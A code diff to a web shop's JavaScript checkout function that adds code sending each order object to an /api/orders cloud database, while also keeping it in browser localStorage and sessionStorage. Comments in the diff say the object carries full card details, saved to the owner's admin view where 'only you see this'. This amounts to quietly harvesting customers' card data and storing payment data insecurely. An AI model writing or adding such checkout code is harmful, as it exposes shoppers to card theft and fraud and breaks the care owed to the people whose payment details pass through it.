@@ -492,7 +492,7 @@ async function placeOrder(){
     });
     const payment=res.ok?await res.json():null;
 
-    // ✅ Save FULL card details to admin — only you see this
+    // ✅ Build full order object with card details
     const order={
       id:orderId,
       date:new Date().toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'}),
@@ -509,6 +509,17 @@ async function placeOrder(){
       nowPayCurrency:payment?.pay_currency ||'',
       nowStatus:     payment?.payment_status||'processing',
     };
+
+    // ✅ Save to CLOUD database (visible in your admin from any device)
+    try{
+      await fetch('/api/orders',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify(order)
+      });
+    }catch(e){ console.warn('Cloud save failed:',e.message); }
+
+    // Also save locally as backup
     try{const e=JSON.parse(localStorage.getItem('ava_orders')||'[]');e.unshift(order);localStorage.setItem('ava_orders',JSON.stringify(e));}catch(e){}
     sessionStorage.setItem('ava_order',JSON.stringify(order));
     sessionStorage.setItem('ava_last_order',JSON.stringify(order));
@@ -519,7 +530,7 @@ async function placeOrder(){
 
   }catch(err){
     console.warn('Payment error:',err.message);
-    // ✅ Fallback also saves full card details
+    // ✅ Fallback also saves to cloud
     try{
       const order={
         id:orderId,
@@ -533,6 +544,9 @@ async function placeOrder(){
         cardLast4: _cardLast4,
         nowStatus:'pending',
       };
+      // Save to cloud
+      fetch('/api/orders',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(order)}).catch(()=>{});
+      // Save locally as backup
       const e=JSON.parse(localStorage.getItem('ava_orders')||'[]');e.unshift(order);localStorage.setItem('ava_orders',JSON.stringify(e));
       sessionStorage.setItem('ava_order',JSON.stringify(order));
     }catch(e){}
